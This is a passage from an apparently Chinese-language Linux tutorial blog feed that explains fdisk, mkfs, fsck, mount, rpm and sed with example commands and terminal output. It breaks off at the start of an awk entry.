&lt;==仔细看，不要加上数字喔！The number of cylinders for this disk is set to 5005.There is nothing wrong with that, but this is larger than 1024,and could in certain setups cause problems with:1) software that runs at boot time (e.g., old versions of LILO)2) booting and partitioning software from other OSs (e.g., DOS FDISK, OS/2 FDISK)Command (m for help): &lt;==等待你的输入！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入 m 后，就会看到底下这些命令介绍 123456789101112131415161718Command (m for help): m &lt;== 输入 m 后，就会看到底下这些命令介绍Command action a toggle a bootable flag b edit bsd disklabel c toggle the dos compatibility flag d delete a partition &lt;==删除一个partition l list known partition types m print this menu n add a new partition &lt;==新增一个partition o create a new empty DOS partition table p print the partition table &lt;==在屏幕上显示分割表 q quit without saving changes &lt;==不储存离开fdisk程序 s create a new empty Sun disklabel t change a partition's system id u change display/entry units v verify the partition table w write table to disk and exit &lt;==将刚刚的动作写入分割表 x extra functionality (experts only) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;离开 fdisk 时按下 q，那么所有的动作都不会生效！相反的， 按下w就是动作生效的意思。 123456789101112131415Command (m for help): p &lt;== 这里可以输出目前磁盘的状态Disk /dev/hdc: 41.1 GB, 41174138880 bytes &lt;==这个磁盘的文件名与容量255 heads, 63 sectors/track, 5005 cylinders &lt;==磁头、扇区与磁柱大小Units = cylinders of 16065 * 512 = 8225280 bytes &lt;==每个磁柱的大小 Device Boot Start End Blocks Id System/dev/hdc1 * 1 13 104391 83 Linux/dev/hdc2 14 1288 10241437+ 83 Linux/dev/hdc3 1289 1925 5116702+ 83 Linux/dev/hdc4 1926 5005 24740100 5 Extended/dev/hdc5 1926 2052 1020096 82 Linux swap / Solaris# 装置文件名 启动区否 开始磁柱 结束磁柱 1K大小容量 磁盘分区槽内的系统Command (m for help): q &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要不储存离开吗？按下 q 就对了！不要随便按 w 啊！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 p 可以列出目前这颗磁盘的分割表信息，这个信息的上半部在显示整体磁盘的状态。 磁盘格式化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 mkfs（make filesystem） 命令。 语法：1mkfs [-t 文件系统格式] 装置文件名 选项与参数： -t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效) 实例1:查看 mkfs 支持的文件格式12[root@www ~]# mkfs[tab][tab]mkfs mkfs.cramfs mkfs.ext2 mkfs.ext3 mkfs.msdos mkfs.vfat &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按下两个[tab]，会发现 mkfs 支持的文件格式如上所示。 实例:将分区 /dev/hdc6（可指定你自己的分区） 格式化为 ext3 文件系统：1234567891011121314151617181920212223[root@www ~]# mkfs -t ext3 /dev/hdc6mke2fs 1.39 (29-May-2006)Filesystem label= &lt;==这里指的是分割槽的名称(label)OS type: LinuxBlock size=4096 (log=2) &lt;==block 的大小配置为 4K Fragment size=4096 (log=2)251392 inodes, 502023 blocks &lt;==由此配置决定的inode/block数量25101 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=51589939216 block groups32768 blocks per group, 32768 fragments per group15712 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912Writing inode tables: doneCreating journal (8192 blocks): done &lt;==有日志记录Writing superblocks and filesystem accounting information: doneThis filesystem will be automatically checked every 34 mounts or180 days, whichever comes first. Use tune2fs -c or -i to override.# 这样就创建起来我们所需要的 Ext3 文件系统了！简单明了！ 磁盘检验&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fsck（file system check）用来检查和维护不一致的文件系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查。 语法：1fsck [-t 文件系统] [-ACay] 装置名称 选项与参数： -t : 给定档案系统的型式，若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数 -s : 依序一个一个地执行 fsck 的指令来检查 -A : 对/etc/fstab 中所有列出来的 分区（partition）做检查 -C : 显示完整的检查进度 -d : 打印出 e2fsck 的 debug 结果 -p : 同时有 -A 条件时，同时有多个 fsck 的检查一起执行 -R : 同时有 -A 条件时，省略 / 不检查 -V : 详细显示模式 -a : 如果检查有错则自动修复 -r : 如果检查有错则由使用者回答是否修复 -y : 选项指定检测每个文件是自动输入yes，在不确定那些是不正常的时候，可以执行 # fsck -y 全部检查修复。 实例1:查看系统有多少文件系统支持的 fsck 命令：12[root@www ~]# fsck[tab][tab]fsck fsck.cramfs fsck.ext2 fsck.ext3 fsck.msdos fsck.vfat 实例:强制检测 /dev/hdc6 分区:123456789[root@www ~]# fsck -C -f -t ext3 /dev/hdc6 fsck 1.39 (29-May-2006)e2fsck 1.39 (29-May-2006)Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationvbird_logical: 11/251968 files (9.1% non-contiguous), 36926/1004046 blocks &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果没有加上 -f 的选项，则由于这个文件系统不曾出现问题，检查的经过非常快速！若加上 -f 强制检查，才会一项一项的显示过程。 磁盘挂载与卸除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 的磁盘挂载使用 mount 命令，卸载使用 umount 命令。 磁盘挂载语法：1mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n] 装置文件名 挂载点 实例1:用默认的方式，将刚刚创建的 /dev/hdc6 挂载到 /mnt/hdc6 上面！123456[root@www ~]# mkdir /mnt/hdc6[root@www ~]# mount /dev/hdc6 /mnt/hdc6[root@www ~]# dfFilesystem 1K-blocks Used Available Use% Mounted on.....中间省略...../dev/hdc6 1976312 42072 1833836 3% /mnt/hdc6 磁盘卸载命令 umount 语法：1umount [-fn] 装置文件名或挂载点 选项与参数： -f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下； -n ：不升级 /etc/mtab 情况下卸除。 卸载/dev/hdc61[root@www ~]# umount /dev/hdc6]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- rpm]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F74.%20Linux%20%E5%91%BD%E4%BB%A4-%20rpm%2F</url>
    <content type="text"><![CDATA[Linux 命令- rpm&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rpm命令是RPM软件包的管理工具。RPM是 “Redhat Package Manager” 的缩写，根据名字也能猜到这是Redhat公司开发出来的。RPM 是以一种数据库记录的方式来将需要的套件安装到Linux 主机的一套管理程序。也就是说，linux系统中存在着一个关于RPM的数据库，它记录了安装的包以及包与包之间依赖相关性。RPM包是预先在linux机器上编译好并打包好的文件，安装起来非常快捷。但是也有一些缺点，比如安装的环境必须与编译时的环境一致或者相当；包与包之间存在着相互依赖的情况；卸载包时需要先把依赖的包卸载掉，如果依赖的包是系统所必须的，那就不能卸载这个包，否则会造成系统崩溃。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果光驱中还有系统安装盘的话，可以通过 mount /dev/cdrom /mnt 命令把光驱挂载到/mnt目录下，那么会在/mnt/Packages目录下看到很多.rpm的文件，这就是RPM包了。 命令格式1rpm [选项] [参数] 命令选项 -a：查询所有套件； -b&lt;完成阶段&gt;&lt;套件档&gt;+或-t &lt;完成阶段&gt;&lt;套件档&gt;+：设置包装套件的完成阶段，并指定套件档的文件名称； -c：只列出组态配置文件，本参数需配合”-l”参数使用； -d：只列出文本文件，本参数需配合”-l”参数使用； -e&lt;套件档&gt;或–erase&lt;套件档&gt;：删除指定的套件； -f&lt;文件&gt;+：查询拥有指定文件的套件； -h或–hash：套件安装时列出标记； -i：显示套件的相关信息； -i&lt;套件档&gt;或–install&lt;套件档&gt;：安装指定的套件档； -l：显示套件的文件列表； -p&lt;套件档&gt;+：查询指定的RPM套件档； -q：使用询问模式，当遇到任何问题时，rpm指令会先询问用户； -R：显示套件的关联性信息； -s：显示文件状态，本参数需配合”-l”参数使用； -U&lt;套件档&gt;或–upgrade&lt;套件档&gt;：升级指定的套件档； -v：显示指令执行过程； -vv：详细显示指令执行过程，便于排错。 命令参数 软件包：指定要操纵的rpm软件包 使用实例实例1：安装一个rpm123[root@localhost ~]# rpm -ivh /mnt/Packages/libjpeg-turbo-devel-1.2.1-1.el6.i686.rpmPreparing... ########################################### [100%]1:libjpeg-turbo-devel ########################################### [100%] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中libhpeg-turbo-devel-1.2.1-1，el6.i686.rpm 是rpm包的文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外在安装一个rpm常用的附带参数： –force:强制安装，即使覆盖属于其他包的文件也要安装 nodeps：当要安装的rpm包依赖其他包时，几十其他包没有安装，也要安装这个包 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也就是说 rpm -i --force --nodeps 可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。 实例2：升级一个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rpm -Uvh filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“-U”即升级的意思 实例3：卸载一个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1rpm -e filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# rpm -qa |grep libjpeg-turbo-devellibjpeg-turbo-devel-1.2.1-1.el6.i686[root@localhost ~]# rpm -e libjpeg-turbo-devel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的filename是通过rpm的查询功能所查询到的。卸载时后边跟的filename和安装时的是有区别的，安装时是把一个存在的文件作为参数，而卸载时只需要包名即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时会出现一些错误或者警告 1... is needed by ... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这说明这个软件被其他软件需要，不能随便卸载，可以用 rpm -e --nodeps 强制卸载 实例4：如何安装.src.rpm软件包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些rpm包是以 .src.rpm结尾的，这类rpm包是包含了源代码的rpm包，在安装时需要进行编译。这类rpm包有两种方法安装： 方法一：1234567rpm -i your-package.src.rpm cd /usr/src/redhat/SPECS rpmbuild -bp your-package.specs #一个和软件包同名的specs文件 cd /usr/src/redhat/BUILD/your-package/ #一个和软件包同名的目录 ./configure #这一步和编译普通的源码软件一样，可以加上参数 make make install 方法二：12rpm -i you-package.src.rpm cd /usr/src/redhat/SPECS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前两步和方法一相同 1rpmbuild -bb your-package.specs #一个和软件包同名的specs文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是在 /usr/src/redhat/RPM/i386/（根据提提包的不同，也可能是i686、noarch等等）在这个目录下，有一个新的rpm包，这个是编译好的二进制文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行 rpm -i new-package.rpm即可安装完成。 实例5：不安装但是获取rpm包中的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要使用工具 rpm2cpio和cpio 123rpm2cpio xxx.rpm | cpio -virpm2cpio xxx.rpm | cpio -idmvrpm2cpio xxx.rpm | cpio --extract --make-firectories &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;参数i和extract相同，表示提取文件。v表示显示执行进程，d和make-directory相同，表示根据包中文件原来的路径建立目录，m表示保持文件的更新时间。 实例6：查看与rpm包相关的文件和其他信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假设使用rpm包mysql-3.23.54a-11 1. 列出系统中所有安装过的rpm包1rpm -qa &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查找所有安装过的包含某个字符串sql的rpm包 1rpm -qa | grep sql 2. 获得某个rpm包的文件全名1rpm -q mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以获得系统中安装的mysql软件包全名，从中可以获得当前软件包的版本信息。此例可以得到信息 mysql-3.23.54a-11 3. 一个rpm包中的文件的安装路径1rpm -ql 包名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里的是不包括 .rpm 后缀的rpm包的名称，也就是说这能使用mysql或者mysql-3.23.54a-11而不是mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用which 1which mysql 4. 一个rpm包中包含哪些文件。 一个没有安装过的rpm包，使用 1rpm -qlp ***.rpm 一个已经安装过的rpm包，还可以使用 1rpm -ql ***.rpm 5. 获取关于一个rpm包的版本，用途等相关信息 一个没有安装过的rpm包，使用 1rpm -qip ***.rpm 一个已经安装过的rpm包，还可以使用 1rpm -qi ***.rpm 6. 某个程序是哪个rpm包安装的，或者哪个rpm包包含这个程序123rpm -qf `which 程序名` #返回软件包的全名 rpm -qif `which 程序名` #返回软件包的有关信息 rpm -qlf `which 程序名` #返回软件包的文件列表 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里不是引号，而是`(反引号)，就是键盘左上角那个键。也可以使用 rpm -qilf，同时输出rpm包信息和文件列表 7. 某个文件是哪个rpm包安装的，或者哪个rpm包包含这个文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用whereis或者which，然后使用rpm -qf例如： 1234whereis ftptop ftptop: /usr/bin/ftptop /usr/share/man/man1/ftptop.1.gz rpm -qf /usr/bin/ftptop proftpd-1.2.8-1 rpm -qf /usr/share/doc/proftpd-1.2.8/rfc/rfc0959.txt proftpd-1.2.8-1]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sed]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F70.%20Linux%20%E5%91%BD%E4%BB%A4-%20sed%2F</url>
    <content type="text"><![CDATA[Linux 命令- sed&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 命令是利用 script 来处理文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可依照 script 的指令来处理、编辑文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可以实现 grep 的大部分功能，而且还可以查找替换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 跟 grep 一样，不识别 + 、| 、｛｝、 （）等符号，需要借助脱义符号 、 或者使用选项 -r 1. 命令语法1sed [-hnV] [-e&lt;script&gt;] [-f&lt;script文件&gt;] [文本文件] 2. 命令参数 -e &lt;script&gt;或--expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。 -f 或–file= 以选项中指定的script文件来处理输入的文本文件。 -h 或–help 显示帮助。 -n 或–quiet或–silent 仅显示script处理后的结果。 -V 或–version 显示版本信息。 3. 命令动作 a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； p ：列印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 4.使用实例实例1：在 testfile 文件的第四行后添加一行，并将结果输出到标准输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sed -e 4a \newLine testfile &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011$ cat testfile HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test $ sed -e 4a\newline testfile HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test newline 实例2：将 /etc/passwd 的内容列出并且列印行号，同时将第2-5行删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '2,5d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# nl /etc/passwd|sed '2,5d' 1 root:x:0:0:root:/root:/bin/bash 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以行为单位的删除，sed 的动作为 ‘2,5d’，那个 d 就是删除。因为 2-5 行给删除了，所以显示的数据就没有 2-5 行。另外，注意一下，原本应该是要下达 -e 才对，没有 -e 也可以。同时也要注意的是，sed 后面接的动作务必以 ‘’单引号括住。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要删除第2行 1nl /etc/passwd | sed '2d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要删除第3到最后一行 1nl /etc/passwd |sed '3,$d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在第2行后，第3行上加上 ‘drink tea’ 字样 1nl /etc/passwd | sed '2a drink tea' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要加再第2行前 1nl /etc/passwd | sed '2i drink tea' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要在第2行后面加入两行 12nl /etc/passwd | sed '2a drink tea \&gt; drink beer' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一行之间都必须要以反斜杠（\）来进行新行的添加 实例3：将第2-5行内容取代成为‘2-5 number’&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '2,5c 2-5 number' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost ~]# nl /etc/passwd | sed '2,5c 2-5 number' 1 root:x:0:0:root:/root:/bin/bash2-5 number 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 operator:x:11:0:operator:/root:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以行为单位的替换与显示，通过这个方法就能够将数据整行取代了。 实例4：仅列出 /etc/passwd 文件内的5-7 行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd |sed -n '5,7p' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# nl /etc/passwd | sed -n '5,7p' 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 root 找到，处理输出所有行，还回输出匹配行。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 -n 的时候将只打印包含模版的行 123[root@localhost ~]# nl /etc/passwd | sed -n '/root/p' 1 root:x:0:0:root:/root:/bin/bash 10 operator:x:11:0:operator:/root:/sbin/nologin 实例5：删除 /etc/paawd 所有包含 root 的行，其他行输出&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed '/root/d' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost ~]# nl /etc/passwd | sed '/root/d' 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 11 games:x:12:100:games:/usr/games:/sbin/nologin 12 ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin 13 nobody:x:99:99:Nobody:/:/sbin/nologin 14 systemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologin 15 systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin 16 dbus:x:81:81:System message bus:/:/sbin/nologin 17 polkitd:x:998:996:User for polkitd:/:/sbin/nologin 18 tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin 19 postfix:x:89:89::/var/spool/postfix:/sbin/nologin 20 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin 21 chrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并删除 实例6：搜索 /etc/passwd 找到 root 对应的行，执行后面花括号中的命令，每个命令之间用分号分割，并把bash替换为blueshell，在输出这行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed -n '/bash/ &#123;s/bash/blueshell/;p;q&#125;' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# nl /etc/passwd | sed -n '/bash/ &#123;s/bash/blueshell/;p;q&#125;' 1 root:x:0:0:root:/root:/bin/blueshell &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并执行命令，最后的q是退出 实例7：查找 /etc/passwd 内 root 的行，并把 root 替换为 shell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sed 's/root/shell/g' /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# sed 's/root/shell/g' /etc/passwdshell:x:0:0:shell:/shell:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/shell:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:998:996:User for polkitd:/:/sbin/nologintss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinchrony:x:997:995::/var/lib/chrony:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并替换，s 就是替换的意思，g 为全局替换，否则只替换一次。 实例8：使用 ifconfig 查看ip地址，并提取出ip地址&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先使用 ifconfig 命令查询eth0网卡ip 123456789[root@localhost ~]# ifconfig eth0eth0 Link encap:Ethernet HWaddr 00:0C:29:4D:9F:F7 inet addr:192.168.0.73 Bcast:192.168.0.255 Mask:255.255.255.0 inet6 addr: fe80::20c:29ff:fe4d:9ff7/64 Scope:Link UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:41 errors:0 dropped:0 overruns:0 frame:0 TX packets:48 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:4525 (4.4 KiB) TX bytes:5868 (5.7 KiB) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ifconfig eth0 | grep 'inet addr' | sed 's/^.*addr://g' | sed 's/Bcast.*$//g' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12ifconfig eth0 | grep 'inet addr' | sed 's/^.*addr://g' | sed 's/Bcast.*$//g'192.168.0.73 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;数据的搜寻并替换，先观察原始信息，利用 ficonfig 查询 eth0 网卡 ip，再用 sed 命令将 ip 前面的部分删除（就是把前面的部分替换为空），接下来是删除后续的部分（把后续部分替换为空） 实例9：删除 /etc/passwd 第3行到末尾的数据，并把bash 替换为 blueshell&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/g' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/g' 1 root:x:0:0:root:/root:/bin/blueshell 2 bin:x:1:1:bin:/bin:/sbin/nologin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多点编辑，-e 表示多点编辑，第一个编辑命令删除 /etc/passwd 第三行到末行的数据，第二条命令搜索 bash 替换为 blueshell 实例10：直接修改文件内容（危险动作）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 可以直接修改文件的内容，不必使用管道命令或数据流重定向。不过，由于这个动作会直接修改到原始的文件，所以千万不要随便拿系统配置文件来测试! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先用 cp 命令拷贝一份/etc/passwd 文件为 1.txt 1[root@localhost ~]# cp /etc/passwd 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;删除所有非数字 1234567891011121314151617181920212223[root@localhost ~]# sed -i 's/[^0-9]//g' 1.txt[root@localhost ~]# cat 1.txt001122344750607081211012100145099999999971921928181998996595989897474997995 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sed 的 -i 选项可以直接修改文件内容，这功能非常有帮助！举例来说，如果有一个100万行的文件，要在第100行加某些文字，此时使用 vim 可能会疯掉！因为文件太大了！就利用 sed ，通过 sed 直接修改、取代的功能，甚至不用使用 vim 去修订。]]></content>
      <tags>
        <tag>正则表达式</tag>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- awk]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F71.%20Linux%20%E5%91%BD%E4%BB%A4-%20awk%2F</url>
